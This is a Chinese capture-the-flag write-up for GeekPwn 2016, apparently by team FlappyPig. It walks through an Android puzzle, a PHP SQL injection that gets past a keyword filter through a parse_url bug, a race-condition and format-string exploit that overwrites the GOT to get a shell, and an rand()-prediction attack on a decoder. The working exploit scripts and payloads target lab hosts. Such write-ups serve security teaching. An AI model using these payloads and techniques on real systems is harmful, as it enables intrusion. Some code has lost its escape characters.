# 【CTF攻略】GeekPwn2016跨次元CTF Writeup

阅读量 **242022**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-11-03 11:32:43

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

**作者：**[ **FlappyPig**
****](http://bobao.360.cn/member/contribute?uid=1184812799)

**稿费：800RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆 **[
**网页版**](http://bobao.360.cn/contribute/index)** 在线投稿**

  

**写在前面**

* * *

跨次元CTF是一个不同于传统CTF的比赛，无论是从线上还是线下。线上赛的题目以离线打包的方式发送给队伍，各队的题目可能存在差别。

经过大家的努力，幸运的进入了跨次元CTF决赛。

线下决赛甚至比初赛更加神秘。Joker一个人去听了tk教主的规则讲解，晚上大家在房间里讨论的时候，得到的信息也很少。基本处于懵逼状态。决赛的性质比较偏向表演赛，但是有些题目还是很有意思。虽然赛场上我们只做了两道题，但是赛后还是补了功课，写了这篇Writeup。

一共四道题目。第一道Android，第二道题Web，三四题都是Pwn。

**无人机的玩法：**

两队的无人机，拥有无限炸弹，自己飞机起飞扣200分，被攻击的队伍扣300分。每队拥有自己的MasterKey和Token,分别用来自行攻击和控制他国攻击

**操控方式：**

用本队服务器访问指定页面

1.自行攻击：http://xxx.com/root.php?key=本队MasterKey

自行攻击是杀敌一千，自损八百的战术。如果平分或者僵局的时候可以选择。

2.控制他国攻击：http://xxx.com/guest.php?token=本队Token&attack=N&flag=M国第P题的flag&pid=P&use=M

(使用M国的第P题的Flag，控制国家M攻击N)

需要注意的是，一个Flag只能用一次，就是两个队拿了相同的Flag，先攻击的有效，后攻击的无效。Flag不会更新。

  

**题目1 无人机的钥匙（Android、Misc）**

* * *

**描述：** 一张神秘的地图被撕碎了，拼接完整这份地图，找到和砸开彩蛋，就可以拿到无人机的钥匙了。

Flag为五位字符串

apk打开，是一个拼图的小游戏，用jeb打开apk可以看出程序将拼图图片的顺序传入到了native层的lib里做验证。

用unzip解压apk，用ida打开lib/armeabi目录下的libhell0.so文件，在导出函数里找到Java_com_geekpwn_1ctf_MainActivity_stringFronJNI函数，如下图

可以看出，如果拼图正确的话会输出Congrats! Pwn the secret egg with m$W2h, and you will get the
flag.随后又拿到一个提示：查看签名文件。

用unzip解压apk，查看其META-INF目录，有一个名为“CERT
.SF”的文件，其中多了一个空格，比较可疑，使用file命令查看发现是一个zip压缩文件

unzip解压缩该文件提示需要密码，尝试之前获取的“m$W2h”作为密码，解压成功。

解压出一个名为98的压缩文件，再解压98解压出一个名为97的压缩文件，推测是循环解压，于是写了个bash脚本解压

    
    
    for((i=97; i>0; --i))
    do
     unzip $i
    done

最后解压出名为0的压缩文件，再解压出来是一个gif文件“Flag2.gif”。

打开之后是一个快速变化的二维码图片，众所周知，mac对gif的支持并不好，于是使用mac自带的“预览”打开gif文件，其每一帧的信息就显示出来了。

使用微信扫描二维码，每幅二维码扫描出来都是一个字符，连接起来是“63E13B2A1EB2558A642E61B343241F5A”。推测是一个MD5，使用cmd5查询即可得到flag。

  

**题目2 无人机病了（Web）**

* * *

**描述：** 无人机需要Injection

**端口：** 80

代码审计题目，代码如下：

    
    
    <?php 
    error_reporting(0);
    if (isset($_GET['view-source'])) {
            show_source(__FILE__);
            exit();
    }
    include("./inc.php"); // Database Connected
    function nojam_firewall(){
        $INFO = parse_url($_SERVER['REQUEST_URI']);
        parse_str($INFO['query'], $query);
        $filter = ["union", "select", "information_schema", "from"];
        foreach($query as $q){
            foreach($filter as $f){
                if (preg_match("/".$f."/i", $q)){
                    nojam_log($INFO);
                    die("attack detected!");
                }
            }
        }
    }
    nojam_firewall();
    function getOperator(&$operator) { 
        switch($operator) { 
            case 'and': 
            case '&&': 
                $operator = 'and'; 
                break; 
            case 'or': 
            case '||': 
                $operator = 'or'; 
                break; 
            default: 
                $operator = 'or'; 
                break; 
    }} 
    if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
        exit('not allowed');
    }
    parse_str($_SERVER['QUERY_STRING']); 
    getOperator($operator); 
    $keyword = addslashes($keyword);
    $where_clause = ''; 
    if(!isset($search_cols)) { 
        $search_cols = 'subject|content'; 
    } 
    $cols = explode('|',$search_cols); 
    foreach($cols as $col) { 
        $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
        if($col) { 
            $query_parts = $col . " like '%" . $keyword . "%'"; 
        } 
        if($query_parts) { 
            $where_clause .= $query_parts; 
            $where_clause .= ' '; 
            $where_clause .= $operator; 
            $where_clause .= ' '; 
            $query_parts = ''; 
        } 
    } 
    if(!$where_clause) { 
        $where_clause = "content like '%{$keyword}%'"; 
    } 
    if(preg_match('/s'.$operator.'s$/isDU',$where_clause)) { 
        $len = strlen($where_clause) - (strlen($operator) + 2);
        $where_clause = substr($where_clause, 0, $len); 
    } 
    ?>
    <style>
        td:first-child, td:last-child {text-align:center;}
        td {padding:3px; border:1px solid #ddd;}
        thead td {font-weight:bold; text-align:center;}
        tbody tr {cursor:pointer;}
    </style>
    <br />
    <table border=1>
        <thead>
            <tr><td>Num</td><td>subject</td><td>content</td><td>writer</td></tr>
        </thead>
        <tbody>
            <?php
                $result = mysql_query("select * from board where {$where_clause} order by idx desc");
                while ($row = mysql_fetch_assoc($result)) {
                    echo "<tr>";
                    echo "<td>{$row['idx']}</td>";
                    echo "<td>{$row['subject']}</td>";
                    echo "<td>{$row['content']}</td>";
                    echo "<td>{$row['writer']}</td>";
                    echo "</tr>";
                }
            ?>
        </tbody>
        <tfoot>
            <tr><td colspan=4>
                <form method="">
                    <select name="search_cols">
                        <option value="subject" selected>subject</option>
                        <option value="content">content</option>
                        <option value="content|content">subject, content</option>
                        <option value="writer">writer</option>
                    </select>
                    <input type="text" name="keyword" />
                    <input type="radio" name="operator" value="or" checked /> or &nbsp;&nbsp;
                    <input type="radio" name="operator" value="and" /> and
                    <input type="submit" value="SEARCH" />
                </form>
            </td></tr>
        </tfoot>
    </table>
    <br />
    <a href="./?view-source">view-source</a><br />

漏洞很明显，line 47 parse_str 导致变量覆盖，line 59 若 $col为 False 就不会进入赋值语句，也就是说
$query_parts 因变量覆盖可控，而在 line 56-59 可以看到 $col 是对输入做正则匹配的返回值，也就是说 $col
可控，进而导致注入，url：/index.php?search_cols=a&keyword=xxxx&operator=and&query_parts={injection}
。

但是在 line 12-24 可以看到有一防注入函数，想要更好出数据肯定要绕过防注入。函数是通过 parse_url、parse_str 解析 url
参数，然后通过正则限制关键字的方式做的过滤，常规的方法绕过相对困难。

这里用到了 parse_url 函数在解析 url 时存在的 bug，通过：////x.php?key=value 的方式可以使其返回
False。具体可以看下[[parse_url的源码]](https://github.com/php/php-src/blob/9df6112e01eacb6e068e8d23e78181918bdab548/ext/standard/url.c#L97)，关键代码如下：

    
    
    PHPAPI php_url *php_url_parse_ex(char const *str, size_t length)
    {
        char port_buf[6];
        php_url *ret = ecalloc(1, sizeof(php_url));
        char const *s, *e, *p, *pp, *ue;
        ...snip...
    } else if (*s == '/' && *(s + 1) == '/') { /* relative-scheme URL */
            s += 2;
        } else {
            just_path:
            ue = s + length;
            goto nohost;
        }
        e = s + strcspn(s, "/?#");
        ...snip...
        } else {
            p = e;
        }
        /* check if we have a valid host, if we don't reject the string as url */
        if ((p-s) < 1) {
            if (ret->scheme) efree(ret->scheme);
            if (ret->user) efree(ret->user);
            if (ret->pass) efree(ret->pass);
            efree(ret);
            return NULL;
        }

可以看到，在函数 parse_url 内部，如果 url 是以 //开始，就认为它是相对 url，而后认为 url 的部件从 url+2 开始。line
281，若 p-s < 1也就是如果 url 为 ///x.php，则 p = e = s = s + 2，函数将返回 NULL。

再看 PHP_FUNCTION，line 351：

    
    
    /* {{{ proto mixed parse_url(string url, [int url_component])
       Parse a URL and return its components */
    PHP_FUNCTION(parse_url)
    {
        char *str;
        size_t str_len;
        php_url *resource;
        zend_long key = -1;
        if (zend_parse_parameters(ZEND_NUM_ARGS(), "s|l", &str, &str_len, &key) == FAILURE) {
            return;
        }
        resource = php_url_parse_ex(str, str_len);
        if (resource == NULL) {
            /* @todo Find a method to determine why php_url_parse_ex() failed */
            RETURN_FALSE;
        }

若 php_url_parse_ex结果为 NULL，函数 parse_url 将返回 FALSE，测试如下：

    
    
    ➜ ~ uname -a
    Linux kali 4.7.0-kali1-amd64 #1 SMP Debian 4.7.8-1kali1 (2016-10-24) x86_64 GNU/Linux
    ➜ ~ php -v
    PHP 7.0.12-1 (cli) ( NTS )
    Copyright (c) 1997-2016 The PHP Group
    Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies
        with Zend OPcache v7.0.12-1, Copyright (c) 1999-2016, by Zend Technologies
    ➜ ~ php -a
    Interactive mode enabled
    php > var_dump(parse_url('///x.php?key=value'));
    bool(false)

函数 php_url_parse_ex中还存在很多类似的问题，而 parse_url 中又没有对其解析失败的原因进行分析，导致 parse_url
频繁出现类似的 bug，比如主办方后来放出的 hint：[[Bug
#55511]](https://bugs.php.net/bug.php?id=55511)。

$INFO = parse_url($_SERVER['REQUEST_URI']) = FALSE，后续的过滤也就完全无用了，成功绕过防注入。最终
payload 如下：

    
    
    ////index.php?search_cols=a|b&keyword=xxxx&operator=and&query_parts=123 union select 1,2,3,flag from flag

  

**题目3：无人机驾驶员飞行日志（Pwn1）**

* * *

**描述：**
无人机驾驶员惠惠养成了记飞行日志的好习惯，一开始用C语言写了一套，后来觉得Python大法好,又用Python写了一套飞航日志系统。所以旁友，系统会有什么问题呢？

**端口：** 6161

**端口：** 6162

给了Blog-bin、Blog-py、run-blog文件，其中Blog-bin是32位elf，Blog-py是pyc文件，run-blog是bash文件

    
    
    run-blog
    #! /usr/bin/python
    import os
    os.chdir('/tmp/pwn')＃原题是/home/pwn1
    os.system('python Blog-py.py')
    
    
    Blog-bin.c
    #include <stdio.h>
    #include <time.h>
    #include <string.h>
    int menu();
    void write_blog();
    void read_blog();
    int list_blog(char *s);
    int check_vaild(char c);
    int menu()
    {
        int i;
        fprintf(stdout, "---- UAV Pilot Blog Version 1.0 ----n");
        fprintf(stderr, "1. List Blogn");
        fprintf(stdout, "2. Write Blogn");
        fprintf(stdout, "3. Read Blogn");
        fprintf(stdout, "4. Exitn");
        fprintf(stdout, "------------------------------------n");
        fprintf(stdout, "Your choice: ");
        fflush(stdout);
        scanf("%d", &i);
        getchar();
        return i;
    }
    int check_vaild(char c)
    {
        if(((c>=97)&&(c<=122))||((c>=65)&&(c<=90))||(c==32)||(c==46)||((c>=48)&&(c<=57))||(c==0)||(c==10))
        {
            return 1;
        }
        else
        {
            return 0;
        }
    }
    void write_blog()
    {
        int flag;
        char c;
        FILE *fp;
        char filename[255];
        char content[1024] = {0};
        flag = 1;
        time_t now;
        time(&now);
        int i;
        i = 0;
        fprintf(stdout, "Please input blog content: n");
        fflush(stdout);
        while(1)
        {
            c = getchar();
            if((c==0)||(i>=1022)||(flag != 1))
            {
                break;
            }
            if(check_vaild(c))
            {
                content[i] = c;
            }else{
                exit(0);
            }
            i += 1;
        }
        content[i+1] = 0;
        sprintf(filename, "%ld.em", now);
        // printf("filename : %sn", filename);
        fp = fopen(filename, "a+");
        if (fp == NULL)
        {
            fprintf(stdout, "Open file error!n");
            fprintf(stdout, "Byen");
            fflush(stdout);
            exit(0);
        }
        fprintf(fp, "%s", content);
        fclose(fp);
        fp = fopen("filelog.txt", "a+");
        fprintf(fp, "%sn", filename);
        fclose(fp);
    }
    void read_blog()
    {
        char filename[255] = {0};
        char content[2048];
        char c;
        int flag;
        flag = 1;
        FILE *fp;
        int i;
        i = 0;
        fprintf(stdout, "Please input blog name: n");
        fflush(stdout);
        while(1)
        {
            c = getchar();
            if((c==10)||(i>=200)||(flag != 1))
            {
                break;
            }
            if(check_vaild(c))
            {
                filename[i] = c;
            }else{
                exit(0);
            }
            i += 1;
        }
        filename[i+1] = 0;
        if(list_blog(filename))
        {
            fp = fopen(filename, "r");
            if (fp == NULL)
            {
                fprintf(stdout, "Open file error!n");
                fprintf(stdout, "Byen");
                fflush(stdout);
                exit(0);
            }
            int count = 0;
            while (!feof(fp))
            {
                c = fgetc(fp);
                content[count] = c;
                count += 1;
            }
            content[count] = 0;
            fclose(fp);
            fprintf(stdout, content);
            fflush(stdout);
            fprintf(stdout, "n");
            fflush(stdout);
        }
        else
        {
            fprintf(stdout, "Blog not exist!n");
            fprintf(stdout, "Bye!n");
            fflush(stdout);
        }
    }
    int list_blog(char *s)
    {
        FILE *fp;
        char *line = NULL;
        size_t len = 0;
        ssize_t read;
        fp = fopen("filelog.txt", "r");
        if (fp == NULL)
        {
            fprintf(stdout, "Open file error!n");
            fprintf(stdout, "Byen");
            fflush(stdout);
            exit(0);
        }
        int cmp, flag;
        cmp = strcmp("main", s);
        flag = 0;
        char tmp_str[20];
        memset(tmp_str,0,20);
        if(cmp == 0)
        {
            fprintf(stdout, "----- Blog List -----n");
            fflush(stdout);
        }
        while ((read = getline(&line, &len, fp)) != -1) 
        {
            if(cmp == 0)
            {
                fprintf(stdout, "%s", line);
                fflush(stdout);
            }
            else
            {
                strncpy(tmp_str, line, 13);
                if(!strcmp(tmp_str, s))
                {
                    flag = 1;
                    return 1;
                }
            }
        }
        if(cmp == 0)
        {
            fprintf(stdout, "---------------------n");
            fflush(stdout);
        }
        fclose(fp);
        return 0;
    }
    int main()
    {
        int choice;
        while(1)
        {
            choice = menu();    
            switch(choice)
            {
                case 1:
                    list_blog("main");
                    break;
                case 2:
                    write_blog();
                    break;
                case 3:
                    read_blog();
                    break;
                case 4:
                    return 0;
            }
        }
        return 0;
    }
    
    
    反编译Blog-py
    import time
    import os
    import sys
    class flushfile(object):
        def __init__(self, f):
            self.f = f
        def write(self, x):
            self.f.write(x)
            self.f.flush()
    sys.stdout = flushfile(sys.stdout)
    def gen_id():
        now = int(time.time())
        return '%d.em' % now
    def list_blog():
        l = []
        f = open('bloglist.txt', 'r')
        l = [ x.strip() for x in f ]
        f.close()
        return l
    def write_blog():
        content = raw_input('Please input blog content: n')
        filename = gen_id()
        fw = open(filename, 'a+')
        fw.write(content)
        fw.close()
        while True:
            try:
                f = open('bloglist.txt', 'a+')
                break
            except:
                pass
        f.write(filename + 'n')
        f.close()
    def read_blog():
        filename = raw_input('Please input blog name: n')
        filename = filename.strip()
        if filename not in list_blog():
            if not os.path.exists(filename):
                print 'File not exist!'
                return
        fr = open(filename, 'r')
        content = fr.read()
        fr.close()
        print content
    def menu():
        print '---- UAV Pilot Blog Version 2.0 ----'
        print '   1. List Blog'
        print '   2. Write Blog'
        print '   3. Read Blog'
        print '   4. Exit'
        print '------------------------------------'
        return raw_input('Your choice: n')
    def main():
        choice = int(menu())
        if choice == 1:
            print '-- File List --'
            for x in list_blog():
                print x
            print '---------------'
        if choice == 2:
            write_blog()
        if choice == 3:
            read_blog()
        if choice == 4:
            exit()
    if __name__ == '__main__':
        os.chdir('/tmp/pwn/')
        while True:
            main()

  

**漏洞分析**

可以看到bin文件对文件名和内容进行了严格的过滤，但是py文件并没有过滤，可以通过race
condition请求bin和py文件来修改xxxx.em的内容，在read_blog函数读取文件内容并显示输出的时候即可达到格式化字符串的目的fprintf(stdout,
content);

第一次race然后格式化可以到达info
leak泄漏got表，第二次race在格式化可以修改fputs.got表，然后在write_blog函数中getshell(fputs(v7,
stream)ida中)

**本地测试**

本地socat 4444端口是bin，socat 6666端口是py

    
    
    socat tcp-l:6666,reuseaddr,fork exec:./run_blog 
    socat tcp-l:4444,reuseaddr,fork exec:./Blog-bin

**exp(代码有段乱)**

    
    
    # -*-coding:utf-8-*-    __author__ = '0x9k'
    from pwn import *
    import time
    from libformatstr import FormatStr
    fputs_got = 0x0804B05C
    r = remote("172.16.33.144", 4444)#pwn
    #context.log_level = "debug"
    #race condition
    print r.recvuntil("choice: ")
    r.sendline("2")
    print r.recvuntil("content: n")
    payload = "x00"
    r.sendline(payload)
    joker_time = int(time.time())
    r1 = remote("172.16.33.144", 6666)#python
    print r1.recvuntil("choice: ")
    r1.sendline("2")
    print r1.recvuntil("content:")
    payload = p32(fputs_got)
    payload += "%74$s"#leak fputs_got
    r1.sendline(payload)
    joker_time = int(time.time())
    print r1.recvuntil("choice:")
    r1.sendline("4")
    r1.close()
    #race condition
    #format_vuln
    print r.recvuntil("choice:")
    r.sendline("3")
    payload = str(joker_time) + ".emx00"
    print joker_time
    raw_input("joker")
    print r.recvuntil("name: n")
    r.sendline(payload)
    #format_vuln
    content = r.recvuntil("n").replace("n","")
    fputs_addr = u32(content[-5:-1])
    print "[*] fputs addr:{0}".format(hex(fputs_addr))
    system_offset = 0x00040310#local
    fputs_offset = 0x00064230#local
    system_addr = fputs_addr - fputs_offset + system_offset
    print "[*] system addr:{0}".format(hex(system_addr))
    #race condition
    print r.recvuntil("choice: ")
    r.sendline("2")
    print r.recvuntil("content: n")
    payload = "x00"
    r.sendline(payload)
    joker_time = int(time.time())
    p = FormatStr()
    p[fputs_got] = system_addr
    payload = p.payload(74,start_len =0x0)
    r1 = remote("172.16.33.144", 6666)#python
    print r1.recvuntil("choice: ")
    r1.sendline("2")
    print r1.recvuntil("content:")
    r1.sendline(payload)
    joker_time = int(time.time())
    print r1.recvuntil("choice:")
    r1.sendline("4")
    r1.close()
    #race condition
    #format_vuln
    raw_input("joker")
    print r.recvuntil("choice:")
    r.sendline("3")
    payload = str(joker_time) + ".emx00"
    print joker_time
    raw_input("joker")
    print r.recvuntil("name: n")
    r.sendline(payload)
    #format_vuln
    print r.recvuntil("choice:")
    r.sendline("2")
    print r.recvuntil("content: n")
    payload = "shx00"
    r.sendline(payload)
    joker_time = int(time.time())
    r.interactive()

  

**题目4：无人机的图像解码器**

* * *

**描述：** 这个无人机有一点微小的不同，就是它配备了一个图像解码器，而Flag就藏在解码器里面。

**端口：** 6163

题目开启了端口6061,提供了一个文件ImageDecoder文件，模拟了图片decode，源码如下

    
    
    ##source code
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <time.h>
    bool has_width = false;
    bool has_height = false;
    bool has_data = false;
    bool need_exit = false;
    unsigned char flag[40] = { 0 };
    void initflag()
    {
        FILE *fp = fopen("flag.txt", "rb");
        if (fp != NULL)
        {
            fread(flag, sizeof(flag), 1, fp);
            fclose(fp);
        }
    }
    unsigned int randint(unsigned int low, unsigned int high)
    {
        return rand() % (high - low) + low;
    }
    void readflag(unsigned char* buffer, unsigned int offset, unsigned int size)
    {
        int total = sizeof(flag);
        if (size > total)
        {
            size = total;
        }
        if (offset >= total)
        {
            offset = total - 1;
        }
        if (size + offset > total)
        {
            offset = randint(0, total);
            size = 1;
        }
        memcpy(buffer, flag+offset, size);
    }
    void show_welcome_msg()
    {
        fprintf(stdout, "................................................n");
        fprintf(stdout, ".       Welcome to Image Decoding System       .n");
        fprintf(stdout, "................................................n");
        fflush(stdout);
    }
    int show_main_menu()
    {
        fprintf(stdout, "nEnter a option to start:n");
        fprintf(stdout, "1. Size parametersn");
        fprintf(stdout, "2. Image datan");
        fprintf(stdout, "3. Decode imagen");
        fprintf(stdout, "4. Exitn");
        fflush(stdout);
        int result = 0;
        fscanf(stdin, "%d", &result);
        return result;
    }
    void handle_size(int& width, int& height)
    {
        fprintf(stdout, "width: ");
        fflush(stdout);
        fscanf(stdin, "%d", &width);
        fprintf(stdout, "height: ");
        fflush(stdout);
        fscanf(stdin, "%d", &height);
        if (width <= 0 || height <= 0 || width > 0x20 || height > 0x20)
        {
            fprintf(stdout, "bad width or height :( bye byen");
            fflush(stdout);
            need_exit = true;
            return;
        }
        has_width = has_height = true;
        has_data = false;
        fprintf(stdout, "Accepted! width = %d, height = %dn", width, height);
        fflush(stdout);
    }
    void handle_data(int width, int height, unsigned char*& data)
    {
        if (!has_width || !has_height)
        {
            fprintf(stdout, "no width or height assigned, ");
            fprintf(stdout, "you need to handle choice 1 first!n");
            fflush(stdout);
            return;
        }
        has_data = false;
        if (data)
        {
            free(data);
            data = NULL;
        }
        int total = width * height;
        data = (unsigned char*)malloc(total);
        fprintf(stdout, "enter %d bytes of data, use an integer to represent a byten", total);
        fprintf(stdout, "for eaxmple, enter 65 if you want to enter character 'A'n");
        fflush(stdout);
        for (int i = 0; i < total; ++i)
        {
            int temp = 0;
            fscanf(stdin, "%d", &temp);
            if (temp < 0 || temp > 255)
            {
                fprintf(stdout, "error data format :(");
                fflush(stdout);
                return;
            }
            data[i] = char(temp & 0xFF);
        }
        has_data = true;
    }
    void handle_decode(int width, int height, unsigned char*& data)
    {
        volatile unsigned short flag_offset = randint(0, sizeof(flag));
        volatile unsigned short flag_size = 1;
        unsigned char img_data[128] = { 0 };
        if (!has_data) 
        {
            fprintf(stdout, "no data available, ");
            fprintf(stdout, "you need to handle choice 2 first!n");
            fflush(stdout);
            return;
        }
        int total = width * height;
        int offset = 0;
        if (total == 0x7FFFFFFF)
        {
            flag_size = 0;
        }
        if (total < offset + 4 || *(unsigned int*)(data + offset) != 0x78563412)
        {
            fprintf(stdout, "bad magic number :(n");
            fflush(stdout);
            return ;
        }
        offset += 4;
        int rgb_nums = 4;
        if (total < offset + 3*rgb_nums)
        {
            fprintf(stdout, "bad image format :(n");
            fflush(stdout);
            return ;
        }
        for (int i = 0; i < rgb_nums; ++i)
        {
            int r = data[offset++];
            int g = data[offset++];
            int b = data[offset++];
            if ((r&1) == 0 || (g&1) == 1)
            {
                fprintf(stdout, "bad pixel value :(n");
                fflush(stdout);
                return ;
            }
            *(unsigned short *)(img_data + b) = 0x00FF;
        }
        if (total > offset)
        {
            for (int i = 0; i < 128; ++i)
            {
                readflag(img_data + i, flag_offset + (data[offset++] & 1), flag_size);
                if (offset >= total)
                {
                    break;
                }
            }
        }
        img_data[127] = '';
        fprintf(stdout, "decode result: %sn", img_data);
        fflush(stdout);
    }
    int main(int argc, char** argv)
    {
        unsigned char* data = NULL;
        int width = 0;
        int height = 0;
        initflag();
        show_welcome_msg();
        srand((unsigned int)time(NULL));
        while (!need_exit)
        {
            int choice = show_main_menu();
            switch (choice)
            {
            case 1:
                handle_size(width, height);
                break;
            case 2:
                handle_data(width, height, data);
                break;
            case 3:
                handle_decode(width, height, data);
                break;
            case 4:
            default:
                need_exit = true;
                break;
            }
        }
        return 0;
    }

可以看到flag已经读取搭配全局变量flag中，成功利用之后flag会在handle_decode的result中出现

**exp**

    
    
    from zio import *
    import commands
    def do_command(cmd_line):
    (status, output) = commands.getstatusoutput(cmd_line)
    return output
    target = "./ImageDecoder"
    def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    r_m = False
    w_m = False
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    return io
    def set_param(io, w, h):
    io.read_until("4. Exitn")
    io.writeline("1")
    io.read_until(": ")
    io.writeline(str(w))
    io.read_until(": ")
    io.writeline(str(h))
    def image_data(io, content):
    io.read_until("4. Exitn")
    io.writeline("2")
    io.read_until(" 'A'n")
    io.writeline(" ".join([str(ord(c)) for c in content]))
    def decode_image(io):
    io.read_until("4. Exitn")
    io.writeline("3")
    def exit_t(io):
    io.read_until("4. Exitn")
    io.writeline("4")
    def get_flag(io, payload):
    set_param(io, 16, 2)
    image_data(io, payload)
    decode_image(io)
    io.read_until("decode result: ")
    flag = io.read(1)
    return flag
    def pwn(io):
    result = do_command("./get_offset 0")
    payload = ""
    payload += l32(0x78563412)#magic number
    for i in range(4):
    payload += l8(0x1) + l8(0x0) + l8(0x2)
    payload = payload.ljust(16*2, 'b')
    flag = ['-']*40
    for item in result.strip().split(' '):
    info = item.split(":")
    offset = int(info[0])
    index = int(info[1])
    for i in range(offset):
    get_flag(io, payload)
    flag[index] = get_flag(io, payload)
    print "".join(flag)
    print "".join(flag)
    exit_t(io)
    io = get_io(target)
    pwn(io)

其中get_offset是用来辅助计算handle_decode中 randint(0, sizeof(flag));

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    int get_one()
    {
    return randint(0,40);
    }
    int randint(int low,int high)
    {
        return rand() % (high - low) + low;
    }
    int main(int argc,char **argv)
    {
    if(argc <=1)
    {
    srand(time(0));
    }
    else
    {
    srand(time(0) + atoi(argv[1]));
    }
    int i,one,index = 0 ,array[40],count = 0,j = 0;
    while(index <= 39)
    {
    one = get_one();
    for(i = 0; i < index ; i++)
    {
    if(array[i] == one)
    {
    break;
    }
    }
    if(i >= index)
    {
    printf("%d:%d ",count-j,one);
    j = count + 1;
    array[i] = one;
    index++;
    }
    count++;
    }
    printf("n");
    return 0;
    }

结果显示

  

**花絮**

* * *

1.当时我们APK做的很快，但是提交的时候一直失败，以为没做出来，后来Web搞定之后去交Web，也是失败。和主办方核对了半天token最后发现我们把use打成了user..

2.我们拿到Flag操控无人机的时候，都是让自己无人机怼自己的基地..这样收益最大。

3.比赛过程当中大家都很懵逼，各种瞎忙瞎着急，下了台才发现自己队伍是第一。

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **FlappyPig** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84837](/post/id/84837)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t01964e6fc92bf81882.jpg) FlappyPig

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

